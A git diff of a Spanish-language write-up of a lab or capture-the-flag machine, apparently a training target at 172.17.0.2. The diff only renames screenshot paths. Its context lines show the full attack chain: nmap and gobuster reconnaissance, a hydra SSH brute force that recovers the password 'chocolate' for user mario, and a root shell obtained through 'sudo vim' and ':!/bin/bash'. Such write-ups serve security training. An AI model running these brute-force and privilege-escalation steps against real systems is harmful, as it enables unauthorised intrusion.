@@ -34,7 +34,7 @@ Se confirma que el host está activo y se identifica el sistema operativo por el
 sudo nmap -p- --open --min-rate 5000 -sS -vvv -n -Pn 172.17.0.2 -oN AllPorts
 ```
 
-![Escaneo inicial de puertos](screenshots/01.png)
+![Escaneo inicial de puertos](images/01.png)
 
 **Puertos encontrados:**
 
@@ -49,7 +49,7 @@ sudo nmap -p- --open --min-rate 5000 -sS -vvv -n -Pn 172.17.0.2 -oN AllPorts
 nmap -sCV -p22,80 172.17.0.2
 ```
 
-![Detección de versiones de servicios](screenshots/02.png)
+![Detección de versiones de servicios](images/02.png)
 
 Se identifica `OpenSSH 9.2p1` en el puerto 22 y un servidor `PHP cli server 5.5+` en el puerto 80.
 
@@ -59,13 +59,13 @@ Se identifica `OpenSSH 9.2p1` en el puerto 22 y un servidor `PHP cli server 5.5+
 
 ### Sitio alojado en el puerto 80
 
-![Página web principal](screenshots/03.png)
+![Página web principal](images/03.png)
 
 ### Revisión del código fuente
 
 Se inspecciona el código fuente de la página en busca de comentarios, rutas o credenciales filtradas.
 
-![Revisión de código fuente](screenshots/04.png)
+![Revisión de código fuente](images/04.png)
 
 No se encontró información relevante a simple vista.
 
@@ -80,11 +80,11 @@ gobuster dir -u http://172.17.0.2 \
 
 > Se agrega `--exclude-length 10701` porque el servidor devolvía múltiples falsos positivos con código `200`, lo que generaba ruido/errores en el escaneo.
 
-![Error inicial de Gobuster por falsos positivos](screenshots/05.png)
+![Error inicial de Gobuster por falsos positivos](images/05.png)
 
 Tras filtrar por longitud de respuesta, se identifica un directorio de interés:
 
-![Directorio secret.php encontrado](screenshots/06.png)
+![Directorio secret.php encontrado](images/06.png)
 
 📁 **`secret.php`**
 
@@ -94,7 +94,7 @@ Tras filtrar por longitud de respuesta, se identifica un directorio de interés:
 
 Al acceder a `secret.php`, la aplicación revela un nombre propio en el saludo de la página:
 
-![Contenido de secret.php](screenshots/07.png)
+![Contenido de secret.php](images/07.png)
 
 ```
 Hola Mario,
@@ -109,7 +109,7 @@ Esto entrega una pista clara: **`mario`** como posible nombre de usuario válido
 hydra -l mario -P /usr/share/wordlists/rockyou.txt ssh://172.17.0.2 -t 4 -I
 ```
 
-![Ataque de fuerza bruta con Hydra](screenshots/08.png)
+![Ataque de fuerza bruta con Hydra](images/08.png)
 
 ✅ **Credenciales encontradas:**
 
@@ -124,7 +124,7 @@ password: chocolate
 ssh mario@172.17.0.2
 ```
 
-![Acceso SSH exitoso](screenshots/09.png)
+![Acceso SSH exitoso](images/09.png)
 
 Acceso exitoso a la máquina como usuario `mario`.
 
@@ -138,7 +138,7 @@ Acceso exitoso a la máquina como usuario `mario`.
 sudo -l
 ```
 
-![Permisos sudo del usuario mario](screenshots/10.png)
+![Permisos sudo del usuario mario](images/10.png)
 
 El usuario `mario` puede ejecutar `/usr/bin/vim` como `root` sin restricciones:
 
@@ -155,11 +155,11 @@ User mario may run the following commands on trust:
 sudo /usr/bin/vim
 ```
 
-![Ejecución de vim con privilegios sudo](screenshots/11.png)
+![Ejecución de vim con privilegios sudo](images/11.png)
 
 Dentro del editor:
 
-![Vim abierto con privilegios de root](screenshots/12.png)
+![Vim abierto con privilegios de root](images/12.png)
 
 ```vim
 :!/bin/bash
@@ -173,7 +173,7 @@ Este comando genera una shell interactiva heredando los privilegios de `root`.
 whoami
 ```
 
-![Confirmación de acceso root](screenshots/13.png)
+![Confirmación de acceso root](images/13.png)
 
 ✅ **`root`** — privilegios escalados con éxito. Máquina completada.
 
